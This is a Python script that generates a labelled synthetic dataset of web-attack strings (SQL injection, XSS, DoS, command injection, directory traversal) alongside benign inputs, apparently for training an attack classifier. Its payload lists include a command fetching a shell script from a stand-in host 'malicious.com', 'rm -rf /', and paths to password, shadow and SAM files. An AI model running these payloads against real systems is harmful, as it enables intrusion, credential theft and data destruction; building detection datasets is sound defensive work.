import pandas as pd
import numpy as np
from datetime import datetime, timedelta
import random

class AttackDatasetGenerator:
    """Generate synthetic dataset with labeled security attacks"""
    
    def __init__(self, num_samples=1000):
        self.num_samples = num_samples
        self.dataset = []
    
    def generate_sql_injection(self, count):
        """Generate SQL injection payloads"""
        sqli_payloads = [
            "SELECT * FROM users WHERE id=1 OR '1'='1'",
            "admin' --",
            "1' UNION SELECT NULL, NULL, NULL --",
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "1' AND '1'='1",
        ]
        return [(random.choice(sqli_payloads), "SQL_INJECTION") for _ in range(count)]
    
    def generate_xss(self, count):
        """Generate XSS payloads"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]
        return [(random.choice(xss_payloads), "XSS") for _ in range(count)]
    
    def generate_dos(self, count):
        """Generate DoS patterns"""
        dos_payloads = [
            "GET /api HTTP/1.1 " + "A" * 5000,
            "LOIC attack detected",
            "hping3 flood incoming",
            "Slowloris attack pattern",
            "Null byte flood: " + "\x00" * 100,
        ]
        return [(random.choice(dos_payloads), "DOS") for _ in range(count)]
    
    def generate_command_injection(self, count):
        """Generate command injection payloads"""
        cmd_payloads = [
            "test; cat /etc/passwd",
            "file.txt && rm -rf /",
            "127.0.0.1 | ls -la",
            "$(curl malicious.com/shell.sh)",
            "test`whoami`end",
        ]
        return [(random.choice(cmd_payloads), "COMMAND_INJECTION") for _ in range(count)]
    
    def generate_directory_traversal(self, count):
        """Generate directory traversal payloads"""
        dt_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/shadow",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file=../../../../etc/passwd",
        ]
        return [(random.choice(dt_payloads), "DIRECTORY_TRAVERSAL") for _ in range(count)]
    
    def generate_benign(self, count):
        """Generate benign/normal payloads"""
        benign_payloads = [
            "hello world",
            "user@example.com",
            "search query",
            "normal input data",
            "123456",
        ]
        return [(random.choice(benign_payloads), "BENIGN") for _ in range(count)]
    
    def create_dataset(self):
        """Create balanced dataset"""
        per_class = self.num_samples // 6
        
        self.dataset.extend(self.generate_sql_injection(per_class))
        self.dataset.extend(self.generate_xss(per_class))
        self.dataset.extend(self.generate_dos(per_class))
        self.dataset.extend(self.generate_command_injection(per_class))
        self.dataset.extend(self.generate_directory_traversal(per_class))
        self.dataset.extend(self.generate_benign(per_class))
        
        random.shuffle(self.dataset)
        
        df = pd.DataFrame(self.dataset, columns=['payload', 'attack_type'])
        df['timestamp'] = [datetime.now() - timedelta(minutes=x) for x in range(len(df))]
        
        return df
    
    def save_dataset(self, filename="security_dataset.csv"):
        """Save dataset to CSV"""
        df = self.create_dataset()
        df.to_csv(filename, index=False)
        print(f"✓ Dataset saved to {filename}")
        print(f"\nDataset Summary:")
        print(df['attack_type'].value_counts())
        return df


if __name__ == "__main__":
    generator = AttackDatasetGenerator(num_samples=600)
    df = generator.save_dataset("security_dataset.csv")